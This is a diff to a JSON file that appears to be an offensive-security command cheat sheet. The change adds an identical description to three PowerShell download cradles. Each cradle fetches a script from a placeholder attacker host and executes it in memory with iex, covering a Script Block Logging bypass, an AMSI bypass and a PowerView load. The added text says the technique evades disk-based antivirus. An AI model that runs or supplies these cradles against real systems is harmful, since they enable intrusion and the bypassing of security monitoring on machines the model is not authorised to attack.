@@ -32,15 +32,18 @@
   "variations": [
     {
       "label": "Script Block Logging bypass",
-      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/sbloggingbypass.txt')"
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/sbloggingbypass.txt')",
+      "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
     },
     {
       "label": "AMSI bypass",
-      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/Amsi-Byp.txt')"
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/Amsi-Byp.txt')",
+      "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
     },
     {
       "label": "Then load a tool in-memory",
-      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')"
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')",
+      "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
     }
   ],
   "steps": [
